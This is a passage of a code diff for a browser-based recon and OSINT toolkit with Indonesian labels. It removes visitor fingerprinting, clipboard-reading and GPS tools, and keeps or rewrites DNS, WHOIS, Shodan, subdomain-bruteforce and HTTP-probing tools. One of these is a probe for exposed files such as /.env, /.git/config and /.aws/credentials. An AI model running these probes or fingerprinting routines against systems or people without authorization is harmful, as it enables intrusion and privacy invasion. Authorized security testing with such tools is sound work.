-out+='== IP PUBLIK ==\nIP       : '+d.ip+'\nIPv6     : '+(await fetch('https://api6.ipify.org?format=json').then(r=>r.json()).then(x=>x.ip).catch(()=>'(tidak ada IPv6)'))+'\nKota     : '+d.city+', '+d.region+', '+d.country_name+'\nZIP      : '+(d.postal||'-')+'\nLat/Lon  : '+d.latitude+', '+d.longitude+'\nISP      : '+d.org+'\nASN      : '+d.asn+'\nTimezone : '+d.timezone+'\nMobile?  : '+(d.in_eu?'EU':'Non-EU')+'\n\nMaps: https://maps.google.com/?q='+d.latitude+','+d.longitude}catch(e){out+='IP: gagal fetch\n'}
-try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m)out+='\n== IP PRIVATE (WebRTC) ==\n'+m[0]+'\n';pc.close()}};
-pc.createDataChannel('x');await pc.createOffer().then(o2=>pc.setLocalDescription(o2));
-await new Promise(r=>setTimeout(r,1500))}catch{}
-out+='\n== PANDUAN LANJUTAN ==\nJaringan: https://ipleak.net | DNS: https://dnsleaktest.com\nVPN/Proxy: '+(d&&/vpn|proxy|hosting|cloud|datacenter/i.test(d.org||'')?'⚠ TERDETEKSI VPN/PROXY':'Tidak terdeteksi');
-outBox(b,out);bump()});
-
-reg(V,'Screen & Media Info','Resolusi, DPR, color depth, codec support, WebGL GPU info',['device'],
-async(b,o)=>{const gl=document.createElement('canvas').getContext('webgl');
-const dbg=gl?gl.getExtension('WEBGL_debug_renderer_info'):null;
-outBox(b,`== DISPLAY ==
-Layar     : ${screen.width}x${screen.height} (avail ${screen.availWidth}x${screen.availHeight})
-Window    : ${innerWidth}x${innerHeight}
-Depth     : ${screen.colorDepth}-bit
-DPR       : ${devicePixelRatio}x
-Orientation: ${screen.orientation?.type||'?'}
-== MEDIA ==
-Codec H264: ${document.createElement('video').canPlayType('video/mp4; codecs="avc1.42E01E"')}
-Codec VP9 : ${document.createElement('video').canPlayType('video/webm; codecs="vp9"')}
-Codec AV1 : ${document.createElement('video').canPlayType('video/mp4; codecs="av01.0.05M.08"')}
-== GPU (WebGL) ==
-Renderer  : ${gl?(gl.getParameter(gl.RENDERER)||'?'):'n/a'}
-Vendor    : ${gl?(gl.getParameter(gl.VENDOR)||'?'):'n/a'}
-Unmasked  : ${gl&&gl.getExtension('WEBGL_debug_renderer_info')?gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL):'n/a'}`)});
-
-reg(V,'Battery & Sensor Status','Status baterai, online, motion sensor support',['device'],
-async(b,o)=>{let out='';
-try{const b1=await navigator.getBattery();
-out+='Baterai : '+(b1.level*100).toFixed(0)+'%\nCharging: '+(b1.charging?'⚡ YA':'TIDAK')+'\nTime to full: '+b1.chargingTime+'s\nTime to empty: '+b1.dischargingTime+'s\n'}catch{out+='Battery API tidak tersedia di browser ini\n'}
-out+='Online  : '+(navigator.onLine?'YA':'TIDAK')+'\nDevicemotion: '+('ondevicemotion' in window)+'\nDeviceorientation: '+('ondeviceorientation' in window)+'\nAmbient light: '+('onambientlight' in window)+'\nGeolocation: '+('geolocation' in navigator);
-outBox(b,out)});
-
-reg(V,'Clipboard Inspector','Baca & pantau clipboard (butuh izin)',['device'],
-async(b,o)=>{try{const t=await navigator.clipboard.readText();
-outBox(b,'Clipboard saat ini:\n'+(t||'(kosong)')+'\n\n💡 Bisa juga:\nnavigator.clipboard.readText().then(console.log)\nnavigator.clipboard.writeText("teks baru")')}catch(e){outBox(b,'Izin ditolak / tidak didukung. ERR: '+e.message)}});
-
-reg(V,'Geo Location (real GPS)','Minta izin → ambil koordinat GPS presisi + reverse address',['geo','location'],
-async(b,o)=>{if(!navigator.geolocation){outBox(b,'Geolocation tidak didukung');return}
-o.textContent='Meminta izin lokasi...';
-navigator.geolocation.getCurrentPosition(async pos=>{
-const{latitude:lat,longitude:lon,accuracy:acc,speed,heading}=pos.coords;
-let addr='';
-try{const d=await(await fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lon+'&format=json')).json();
-addr=d.display_name||''}catch{}
-outBox(b,`== GPS REAL-TIME ==
-Latitude  : ${lat}
-Longitude : ${lon}
-Akurasi   : ±${acc.toFixed(0)} meter
-Speed     : ${speed!=null?(speed*3.6).toFixed(1)+' km/h':'-'}
-Heading   : ${heading??'-'}°
-== ALAMAT (reverse geocoding) ==
-${addr||'(gagal reverse)'}
-== LINK ==
-Google Maps : https://maps.google.com/?q=${lat},${lon}
-Street View : https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`);bump()},
-err=>outBox(b,'ERR: '+err.message+` — pastikan izin lokasi diaktifkan & HTTPS`),{enableHighAccuracy:true,timeout:10000})});
-
-/* ================= RECON (10) ================= */
+/* ================= RECON (9) ================= */
 reg(P,'IP Geo Locator','Geo-locate IP target',['ip'],
-async(b,o)=>{const ip=ask('IP:','8.8.8.8');if(!ip)return;
-try{const d=await(await fetch('https://ipapi.co/'+ip+'/json/')).json();
-outBox(b,JSON.stringify({ip:d.ip,city:d.city,region:d.region,country:d.country_name,org:d.org,asn:d.asn,lat:d.latitude,lon:d.longitude},null,2))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+async function(b,o){var ip=ask('IP:','8.8.8.8');if(!ip)return;
+try{var d=await(await fetch('https://ipapi.co/'+ip+'/json/')).json();
+outBox(b,'IP    : '+d.ip+'\nKota  : '+d.city+' '+d.region+' '+d.country_name+'\nISP   : '+d.org+'\nASN   : '+d.asn+'\nLat/Lon: '+d.latitude+', '+d.longitude)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'DNS Full Lookup (DoH)','Semua record A/AAAA/MX/TXT/NS/CNAME/SOA/CAA',['dns'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;let out='';
-for(const t of['A','AAAA','MX','TXT','NS','CNAME','SOA','CAA']){
-try{const d=await(await fetch('https://dns.google/resolve?name='+dom+'&type='+t)).json();
-out+='== '+t+' ==\n'+(d.Answer?d.Answer.map(a=>a.name+' '+a.data).join('\n'):'(kosong)')+'\n\n'}catch{}}outBox(b,out);bump()});
+reg(P,'DNS Full Lookup','Record A/AAAA/MX/TXT/NS/CNAME/SOA/CAA via DoH',['dns'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;var out='';
+for(var i=0;i<8;i++){var t=['A','AAAA','MX','TXT','NS','CNAME','SOA','CAA'][i];
+try{var d=await(await fetch('https://dns.google/resolve?name='+dom+'&type='+t)).json();
+out+='== '+t+' ==\n'+(d.Answer?d.Answer.map(function(a){return a.name+' '+a.data}).join('\n'):'(kosong)')+'\n\n'}catch(e){}}outBox(b,out);bump()});
 
-reg(P,'Reverse DNS / PTR','Cari hostname dari IP',['dns'],
-async(b,o)=>{const ip=ask('IP:','8.8.8.8');if(!ip)return;
-try{const d=await(await fetch('https://dns.google/resolve?name='+ip.split('.').reverse().join('.')+'.in-addr.arpa&type=PTR')).json();
-outBox(b,d.Answer?d.Answer.map(a=>a.data).join('\n'):'Tidak ada PTR')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'Reverse DNS (PTR)','Hostname dari IP',['dns'],
+async function(b,o){var ip=ask('IP:','8.8.8.8');if(!ip)return;
+try{var d=await(await fetch('https://dns.google/resolve?name='+ip.split('.').reverse().join('.')+'.in-addr.arpa&type=PTR')).json();
+outBox(b,d.Answer?d.Answer.map(function(a){return a.data}).join('\n'):'Tidak ada PTR')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'WHOIS (RDAP)','Registrant, registrar, tanggal, nameserver',['whois'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;
-try{const d=await(await fetch('https://rdap.org/domain/'+dom)).json();
-outBox(b,JSON.stringify({domain:d.ldhName,status:d.status,events:d.events,nameservers:(d.nameservers||[]).map(n=>n.ldhName)},null,2))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'WHOIS (RDAP)','Registrant/registrar/tanggal domain',['whois'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;
+try{var d=await(await fetch('https://rdap.org/domain/'+dom)).json();
+outBox(b,'Domain : '+(d.ldhName||dom)+'\nStatus : '+(d.status||[]).join(', ')+'\nEvents : '+JSON.stringify(d.events,null,1)+'\nNS     : '+(d.nameservers||[]).map(function(n){return n.ldhName}).join(', '))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'Wayback Machine','Snapshot arsip terakhir + riwayat',['archive'],
-async(b,o)=>{const u=ask('URL/domain:','example.com');if(!u)return;
-try{const d=await(await fetch('https://archive.org/wayback/available?url='+encodeURIComponent(u))).json();
-const s=d.archived_snapshots?.closest;outBox(b,s?'Snapshot: '+s.url+'\nWaktu: '+s.timestamp:'Belum diarsipkan')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'Wayback Machine','Snapshot arsip terakhir',['archive'],
+async function(b,o){var u=ask('URL/domain:','example.com');if(!u)return;
+try{var d=await(await fetch('https://archive.org/wayback/available?url='+encodeURIComponent(u))).json();
+var s=d.archived_snapshots&&d.archived_snapshots.closest;
+outBox(b,s?'Snapshot: '+s.url+'\nWaktu   : '+s.timestamp:'Belum diarsipkan')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'URLScan Intel','Riwayat scan urlscan.io untuk domain',['osint'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;
-try{const d=await(await fetch('https://urlscan.io/api/v1/search/?q=domain:'+dom)).json();
-outBox(b,d.results.slice(0,15).map(r=>r.task.time+' '+r.page.url+' ['+r.page.ip+']').join('\n')||'kosong')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'URLScan Intel','Riwayat scan domain di urlscan.io',['osint'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;
+try{var d=await(await fetch('https://urlscan.io/api/v1/search/?q=domain:'+dom)).json();
+outBox(b,d.results.slice(0,15).map(function(r){return r.task.time+' '+r.page.url+' ['+(r.page.ip||'-')+']'}).join('\n')||'kosong')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'Shodan InternetDB','Cek port & layanan terekspos IP via Shodan InternetDB (no key)',['port'],
-async(b,o)=>{const ip=ask('IP:','');if(!ip)return;
-try{const d=await(await fetch('https://internetdb.shodan.io/'+ip)).json();
-outBox(b,JSON.stringify(d,null,2)+'\n\nPorts: '+(d.ports||[]).join(', ')+'\nVulns: '+(d.vulns||[]).join(', '))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'Shodan InternetDB','Port/service/vuln terekspos IP — gratis tanpa key',['port'],
+async function(b,o){var ip=ask('IP:','');if(!ip)return;
+try{var d=await(await fetch('https://internetdb.shodan.io/'+ip)).json();
+outBox(b,'Ports  : '+(d.ports||[]).join(', ')+'\nHostnames: '+(d.hostnames||[]).join(', ')+'\nCPEs   : '+(d.cpes||[]).join(', ')+'\nVulns  : '+(d.vulns||[]).join(', ')+'\n\nRaw: '+JSON.stringify(d,null,2))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'Cert Transparency Log','Semua sertifikat SSL domain via crt.sh',['ssl'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;
-try{const d=await(await cFetch('https://crt.sh/?q=%25.'+dom+'&output=json')).json();
-outBox(b,d.slice(0,50).map(x=>x.issuer_name+' | '+x.common_name+' | '+x.not_before+' s/d '+x.not_after).join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(P,'Security Headers Audit','Audit + skor header keamanan HTTP',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const r=await cFetch(u);const h=r.headers;const need={'strict-transport-security':'HSTS','content-security-policy':'CSP','x-content-type-options':'XCTO','x-frame-options':'XFO','referrer-policy':'Referrer-Policy','permissions-policy':'Permissions-Policy'};
-let out='',sc=0;for(const k in need){const v=h.get(k);if(v){sc++;out+='✔ '+need[k]+': '+v.slice(0,100)+'\n'}else out+='✘ '+need[k]+': TIDAK ADA\n'}
+reg(P,'Security Headers Audit','Audit + skor header keamanan',['security'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var r=await cFetch(u);var need={'strict-transport-security':'HSTS','content-security-policy':'CSP','x-content-type-options':'XCTO','x-frame-options':'XFO','referrer-policy':'Referrer-Policy'};var out='',sc=0;
+for(var k in need){var v=r.headers.get(k);if(v){sc++;out+='✔ '+need[k]+': '+v.slice(0,90)+'\n'}else out+='✘ '+need[k]+': TIDAK ADA\n'}
 out+='\nSkor: '+sc+'/6';outBox(b,out)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(P,'CORS Misconfig Checker','Tes Access-Control-Allow-Origin target',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const r=await cFetch(u);const a=r.headers.get('access-control-allow-origin'),c=r.headers.get('access-control-allow-credentials');
-outBox(b,a?('ACAO: '+a+'\nACAC: '+(c||'-')+'\n'+(a==='*'&&c==='true'?'⚠ BERBAHAYA':'Normal')):'Header CORS tidak ada')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(P,'CORS Misconfig Checker','Tes Access-Control-Allow-Origin',['security'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var r=await cFetch(u);var a=r.headers.get('access-control-allow-origin'),c=r.headers.get('access-control-allow-credentials');
+outBox(b,a?('ACAO: '+a+'\nACAC: '+(c||'-')+'\n'+(a==='*'&&c==='true'?'⚠ BERBAHAYA':'Normal')):'Tidak ada header CORS')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-/* ================= SUBDOMAIN / SITEMAP / CRAWL (6) ================= */
-reg(U,'Subdomain Finder — crt.sh','Enumerasi subdomain via CT log',['subdomain'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;
-try{const d=await(await cFetch('https://crt.sh/?q=%25.'+dom+'&output=json')).json();
-const s=new Set();d.forEach(x=>String(x.name_value).split('\n').forEach(n=>s.add(n.trim())));
-outBox(b,'Total: '+s.size+'\n\n'+[...s].sort().join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+/* ================= SUBDOMAIN & SITEMAP (6) ================= */
+reg(U,'Subdomain Finder — crt.sh','Enumerasi via certificate transparency',['subdomain'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;
+try{var d=await(await cFetch('https://crt.sh/?q=%25.'+dom+'&output=json')).json();
+var s=new Set();(Array.isArray(d)?d:[]).forEach(function(x){String(x.name_value).split('\n').forEach(function(n){s.add(n.trim())})});
+outBox(b,'Total: '+s.size+'\n\n'+Array.from(s).sort().join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(U,'Subdomain Multi-Source','crt.sh + urlscan + wayback passive',['subdomain'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;const s=new Set();
-try{const d=await(await cFetch('https://crt.sh/?q=%25.'+dom+'&output=json')).json().catch(()=>[]);(Array.isArray(d)?d:[]).forEach(x=>String(x.name_value).split('\n').forEach(n=>s.add(n.trim())))}catch{}
-try{const d2=await(await fetch('https://urlscan.io/api/v1/search/?q=domain:'+dom+'&size=100')).json();d2.results.forEach(r=>{try{s.add(new URL(r.page.url).hostname)}catch{}})}catch{}
-outBox(b,'Total: '+s.size+'\n\n'+[...s].sort().join('\n'));bump()});
+reg(U,'Subdomain Multi-Source','crt.sh + urlscan gabungan',['subdomain'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;var s=new Set();
+try{var d=await(await cFetch('https://crt.sh/?q=%25.'+dom+'&output=json')).json();(Array.isArray(d)?d:[]).forEach(function(x){String(x.name_value).split('\n').forEach(function(n){s.add(n.trim())})})}catch(e){}
+try{var d2=await(await fetch('https://urlscan.io/api/v1/search/?q=domain:'+dom+'&size=100')).json();d2.results.forEach(function(r){try{s.add(new URL(r.page.url).hostname)}catch(e){}})}catch(e){}
+outBox(b,'Total unik: '+s.size+'\n\n'+Array.from(s).sort().join('\n'));bump()});
 
-reg(U,'Subdomain Bruteforce (70 wordlist)','Probe aktif via DoH resolve',['subdomain'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;
-const wl=['www','mail','ftp','admin','portal','vpn','dev','test','staging','api','app','blog','shop','cdn','ns1','ns2','smtp','pop','imap','remote','git','jenkins','jira','confluence','cpanel','webmail','mx','sql','mysql','db','backup','old','new','beta','demo','intranet','files','share','cloud','sso','auth','oauth','id','pay','billing','secure','support','help','docs','status','monitor','grafana','kibana','elastic','redis','cache','proxy','gateway','gw','edge','lb','internal','private','office','exchange','owa','autodiscover','m','mobile','static','img','media','assets'];
-o.textContent='Probe '+wl.length+' host...';const found=[];
-for(const w of wl){try{const d=await(await fetch('https://dns.google/resolve?name='+w+'.'+dom+'&type=A')).json();
-if(d.Answer?.length)found.push(w+'.'+dom+' → '+d.Answer.filter(a=>a.type===1).map(a=>a.data).join(', '))}catch{}}
+reg(U,'Subdomain Bruteforce 70','Probe aktif wordlist via DoH resolve',['subdomain'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;
+var wl=['www','mail','ftp','admin','portal','vpn','dev','test','staging','api','app','blog','shop','cdn','ns1','ns2','smtp','remote','git','jenkins','jira','cpanel','webmail','mx','sql','mysql','db','backup','old','new','beta','demo','intranet','files','share','cloud','sso','auth','oauth','id','pay','billing','secure','support','docs','status','grafana','kibana','redis','cache','proxy','gateway','gw','edge','lb','internal','private','office','owa','autodiscover','m','mobile','static','img','media','assets','ns','ns3','info','shop1'];
+o.textContent='Probe '+wl.length+' host...';var found=[];
+for(var i=0;i<wl.length;i++){try{var d=await(await fetch('https://dns.google/resolve?name='+wl[i]+'.'+dom+'&type=A')).json();
+if(d.Answer&&d.Answer.length)found.push(wl[i]+'.'+dom+' → '+d.Answer.filter(function(a){return a.type===1}).map(function(a){return a.data}).join(', '))}catch(e){}}
 outBox(b,found.length?('DITEMUKAN '+found.length+'\n\n'+found.join('\n')):'Tidak ada yang resolve');bump()});
 
-reg(U,'Sitemap.xml Extractor','Parse sitemap target',['sitemap'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const t=await(await cFetch(u.replace(/\/$/,'')+'/sitemap.xml')).text();
-const locs=[...t.matchAll(/<loc>([^<]+)<\/loc>/g)].map(m=>m[1]);
-outBox(b,(t.includes('<sitemapindex')?'(SITEMAP INDEX)':'(single)')+'\nTotal URL: '+locs.length+'\n\n'+locs.slice(0,500).join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(U,'Sitemap.xml Extractor','Parse sitemap target',['sitemap','xml'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var t=await(await cFetch(u.replace(/\/$/,'')+'/sitemap.xml')).text();
+var locs=[];var re=/<loc>([^<]+)<\/loc>/g,m;while((m=re.exec(t)))locs.push(m[1]);
+outBox(b,(t.indexOf('<sitemapindex')>-1?'(SITEMAP INDEX)':'(single)')+'\nTotal URL: '+locs.length+'\n\n'+locs.slice(0,500).join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
 reg(U,'robots.txt Analyzer','Baca & sorot path tersembunyi',['robots'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const t=await(await cFetch(u.replace(/\/$/,'')+'/robots.txt')).text();
-const dis=[...t.matchAll(/Disallow:\s*(\S+)/g)].map(m=>m[1]).filter(x=>x!=='/');
-outBox(b,'=== RAW ===\n'+t.slice(0,3000)+'\n\n=== PATH ('+dis.length+') ===\n'+[...new Set(dis)].join('\n'))}catch(e){outBox(b,'robots.txt tidak tersedia')}bump()});
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var t=await(await cFetch(u.replace(/\/$/,'')+'/robots.txt')).text();
+var dis=[],re=/Disallow:\s*(\S+)/g,m;while((m=re.exec(t)))if(m[1]!=='/')dis.push(m[1]);
+outBox(b,'=== RAW ===\n'+t.slice(0,3000)+'\n\n=== PATH ('+dis.length+') ===\n'+Array.from(new Set(dis)).join('\n'))}catch(e){outBox(b,'robots.txt tidak tersedia')}bump()});
 
-reg(U,'Site Crawler (BFS)','Crawl link internal hingga 20 halaman',['crawl'],
-async(b,o)=>{const base=ask('URL awal:','https://example.com');if(!base)return;
-const host=new URL(base).hostname,seen=new Set(),q=[base],pages=[];let n=0;
-while(q.length&&n<20){const u=q.shift();if(seen.has(u)||!u.startsWith('http'))continue;seen.add(u);
-try{const r=await cFetch(u);const ct=r.headers.get('content-type')||'';if(!ct.includes('html'))continue;
-const t=await r.text();pages.push(u);n++;
-[...t.matchAll(/href=["']([^"'#?]+)["']/g)].forEach(m=>{try{const a=new URL(m[1],u);if(a.hostname===host)q.push(a.href)}catch{}})}catch{}}
-outBox(b,'Halaman: '+pages.length+'\n\n'+pages.join('\n'));bump()});
+reg(U,'security.txt & Info Pages','Cek /.well-known/security.txt, humans.txt',['recon'],
+async function(b,o){var u=ask('Domain:','https://example.com');if(!u)return;var out='';
+var ps=['/.well-known/security.txt','/security.txt','/humans.txt','/ads.txt'];
+for(var i=0;i<ps.length;i++){try{var r=await cFetch(u.replace(/\/$/,'')+ps[i]);if(r.ok)out+='== '+ps[i]+' ==\n'+(await r.text()).slice(0,500)+'\n\n'}catch(e){}}
+outBox(b,out||'Tidak ada file info publik');bump()});
 
-/* ================= HTTP / CURL / HTTPX / NUCLEI (10) ================= */
-reg(H,'HTTP Request Builder','Method GET/POST/PUT/DELETE + header + body — raw response',['curl'],
-async(b,o)=>{const u=ask('URL:','https://httpbin.org/get');const m=ask('Method:','GET')||'GET';
-const hd=ask('Headers (;):','')||'';
-const body=m!=='GET'?ask('Body:','{"a":1}')||'':null;
-const opt={method:m,headers:{}};hd.split(';').forEach(h=>{const[k,...v]=h.split(':');if(k.trim())opt.headers[k.trim()]=v.join(':').trim()});
+/* ================= HTTP / CURL / HTTPX / NUCLEI (9) ================= */
+reg(H,'HTTP Request Builder (curl-style)','GET/POST/PUT/DELETE + header + body → raw response',['curl'],
+async function(b,o){var u=ask('URL:','https://httpbin.org/get');var m=ask('Method:','GET')||'GET';
+var hd=ask('Headers (K:V; pisah ;):','')||'';
+var opt={method:m,headers:{}};hd.split(';').forEach(function(h){var p=h.split(':');if(p[0]&&p[0].trim())opt.headers[p[0].trim()]=p.slice(1).join(':').trim()});
+var body=m!=='GET'?(ask('Body:','{"a":1}')||''):null;
 if(body){opt.headers['Content-Type']='application/json';opt.body=body}
-try{const r=await cFetch(u);const t=await r.text();const hh=[];r.headers.forEach((v,k)=>hh.push(k+': '+v));
-outBox(b,'== REQUEST ==\n'+m+' '+u+'\n'+JSON.stringify(opt.headers,null,2)+(body?('\n\n'+body):'')+'\n\n== RESPONSE ==\nHTTP '+r.status+' '+r.statusText+'\n'+hh.join('\n')+'\n\n'+t.slice(0,4000))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+try{var r=await cFetch(u);var t=await r.text();var hh=[];r.headers.forEach(function(v,k){hh.push(k+': '+v)});
+outBox(b,'== REQUEST ==\n'+m+' '+u+'\n'+JSON.stringify(opt.headers,null,2)+(body?'\n\n'+body:'')+'\n\n== RESPONSE ==\nHTTP '+r.status+'\n'+hh.join('\n')+'\n\n'+t.slice(0,4000))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(H,'Curl Command Generator','Generate curl bash/powershell siap pakai',['curl'],
-async(b,o)=>{const u=ask('URL:','https://example.com');const m=ask('Method:','GET');
-const hd=ask('Headers (;):','User-Agent: Mozilla/5.0')||'';
-const cmd='curl -'+(m==='GET'?'s':'s -X '+m)+' \\\n'+hd.split(';').map(h=>"  -H '"+h.trim()+"' \\\n").join('')+(m!=='GET'?"  -d '{\"key\":\"value\"}' \\\n":"")+"  '"+u+"'";
-outBox(b,'== BASH ==\n'+cmd+'\n\n== POWERSHELL ==\n'+cmd.replace(/-H/g,'-Headers').replace(/'/g,'"'));bump()});
+reg(H,'Curl Command Generator','Generate command curl bash/powershell',['curl'],
+async function(b,o){var u=ask('URL:','https://example.com');var m=ask('Method:','GET');
+var hd=ask('Headers (;):','User-Agent: Mozilla/5.0')||'';
+var cmd='curl -'+(m==='GET'?'s':'s -X '+m)+' \\\n'+hd.split(';').map(function(h){return "  -H '"+h.trim()+"' \\\n"}).join('')+"  '"+u+"'";
+outBox(b,'== BASH ==\n'+cmd+'\n\n== POWERSHELL ==\n'+cmd.replace(/-H /g,'-Headers ').replace(/'/g,'"'))});
 
-reg(H,'httpx-style Prober','Multi-URL: status, title, server, length',['httpx'],
-async(b,o)=>{const list=ask('URL list (newline/koma):','example.com\nhttpbin.org');if(!list)return;
-const urls=list.split(/[\n,]+/).map(x=>x.trim()).filter(Boolean).map(x=>/^https?:/.test(x)?x:'https://'+x);
-let out='URL | STATUS | TITLE | SERVER | LEN\n';
-for(const u of urls.slice(0,30)){try{const r=await cFetch(u);const t=await r.text();const ti=(t.match(/<title[^>]*>([^<]*)/i)||[])[1]||'-';
-out+=u+' | '+r.status+' | '+ti.slice(0,50)+' | '+(r.headers.get('server')||'-')+' | '+t.length+'\n'}catch{out+=u+' | FAIL\n'}}
+reg(H,'httpx-style Prober','Multi-URL: status, title, server, panjang respons',['httpx'],
+async function(b,o){var list=ask('URL list (newline/koma):','example.com\nhttpbin.org');if(!list)return;
+var urls=list.split(/[\n,]+/).map(function(x){return x.trim()}).filter(Boolean).map(function(x){return/^https?:/.test(x)?x:'https://'+x});
+var out='';o.textContent='Probe '+urls.length+' URL...';
+for(var i=0;i<urls.length&&i<30;i++){try{var r=await cFetch(urls[i]);var t=await r.text();
+var ti=(t.match(/<title[^>]*>([^<]*)/i)||[])[1]||'-';
+out+=urls[i]+' | '+r.status+' | '+ti.slice(0,50)+' | '+(r.headers.get('server')||'-')+' | '+t.length+'\n'}catch(e){out+=urls[i]+' | FAIL\n'}}
 outBox(b,out);bump()});
 
-reg(H,'Nuclei-style Exposed Files','Probe /.env /.git /phpinfo /backup dll — aset Anda',['nuclei'],
-async(b,o)=>{const u=ask('URL (HARUS authorized):','https://example.com');if(!u)return;
-const base=u.replace(/\/$/,'');const paths=['/.env','/.git/config','/phpinfo.php','/info.php','/.DS_Store','/composer.json','/package.json','/.aws/credentials','/backup.zip','/db.sql','/admin/','/wp-login.php','/server-status','/.htaccess','/config.php.bak','/debug/vars','/actuator/env'];
-let out='';for(const p of paths){try{const r=await cFetch(base+p);const t=await r.text();
-if(r.status===200&&t.length>10&&!/^<(\!DOCTYPE|html)/i.test(t))out+='⚠ '+r.status+' '+p+' ('+t.length+'B) — '+t.slice(0,80).replace(/\n/g,' ')+'\n';
-else if(r.status!==404)out+='[INFO] '+r.status+' '+p+'\n'}catch{}}
-outBox(b,out||'✔ Tidak ada file sensitif terekspos.\nnuclei lengkap (local): nuclei -u '+base+' -t exposures/ -severity high,critical');bump()});
+reg(H,'Nuclei-style Exposed Files','Probe /.env /.git /phpinfo /backup — aset authorized Anda',['nuclei'],
+async function(b,o){var u=ask('URL (HARUS authorized):','https://example.com');if(!u)return;
+var base=u.replace(/\/$/,'');var paths=['/.env','/.git/config','/phpinfo.php','/.DS_Store','/composer.json','/.aws/credentials','/backup.zip','/db.sql','/admin/','/wp-login.php','/server-status','/.htaccess','/config.php.bak','/actuator/env'];
+var out='';o.textContent='Probe '+paths.length+' path...';
+for(var i=0;i<paths.length;i++){try{var r=await cFetch(base+paths[i]);var t=await r.text();
+if(r.status===200&&t.length>10&&!/^<(!DOCTYPE|html)/i.test(t))out+='⚠ '+r.status+' '+paths[i]+' ('+t.length+'B) — '+t.slice(0,80).replace(/\n/g,' ')+'\n';
+else if(r.status!==404)out+='[INFO] '+r.status+' '+paths[i]+'\n'}catch(e){}}
+outBox(b,out||'✔ Tidak ada file sensitif terekspos.\n\nNuclei lengkap (lokal):\nnuclei -u '+base+' -t exposures/ -severity high,critical');bump()});
 
-reg(H,'Status Code & Redirect Chain','Trace redirect hingga final URL',['http'],
-async(b,o)=>{const u=ask('URL:','http://github.com');if(!u)return;let out='',cur=u;
-try{for(let i=0;i<5;i++){const r=await cFetch(cur);out+='['+r.status+'] '+cur+'\n';
-if(r.status>=300&&r.status<400){const loc=r.headers.get('location');if(!loc)break;cur=new URL(loc,cur).href}else{out+='FINAL: '+cur;break}}}catch(e){out+='STOP: '+e.message}
+reg(H,'Redirect Chain Tracer','Trace redirect hingga final URL',['http'],
+async function(b,o){var u=ask('URL:','http://github.com');if(!u)return;var out='',cur=u;
+for(var i=0;i<5;i++){try{var r=await cFetch(cur);out+='['+r.status+'] '+cur+'\n';
+if(r.status>=300&&r.status<400){var loc=r.headers.get('location');if(!loc)break;cur=new URL(loc,cur).href}else{out+='FINAL: '+cur;break}}catch(e){out+='STOP: '+e.message;break}}
 outBox(b,out);bump()});
 
-reg(H,'CSP Parser & Evaluator','Evaluasi kelemahan CSP target',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const r=await cFetch(u);const c=r.headers.get('content-security-policy');
-if(!c){outBox(b,'✘ TIDAK ADA CSP — kelemahan medium');return}
-let out='CSP: '+c+'\n\nEvaluasi:\n';
+reg(H,'WAF Detector','Deteksi Cloudflare/AWS/Imperva/Akamai dari signature',['security'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var r=await cFetch(u);var t=await r.text();var keys=Array.from(r.headers.keys()).join(' ')+(r.headers.get('server')||'');
